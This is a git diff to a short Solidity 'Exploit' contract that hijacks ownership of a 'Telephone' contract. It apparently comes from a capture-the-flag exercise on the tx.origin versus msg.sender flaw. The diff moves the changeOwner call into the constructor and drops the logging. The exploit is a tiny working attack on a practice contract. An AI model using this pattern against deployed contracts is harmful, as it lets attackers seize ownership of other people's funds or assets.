@@ -5,17 +5,7 @@ import "forge-std/console.sol";
 import "./Telephone.sol";
 
 contract Exploit {
-    Telephone public telephone;
-
-    constructor(address _telephoneAddress) {
-        telephone = Telephone(_telephoneAddress);
-        console.log("Exploit Address:", address(this));
-    }
-
-    function exploit(address _newOwner) public {
-        // the tx.origin is the EOA calling this function
-        // the msg.sender would be address(this)
-        console.log("Exploiting");
-        telephone.changeOwner(_newOwner);
+    constructor(Telephone _targetContract, address _newOwner) {
+        _targetContract.changeOwner(_newOwner);
     }
 }
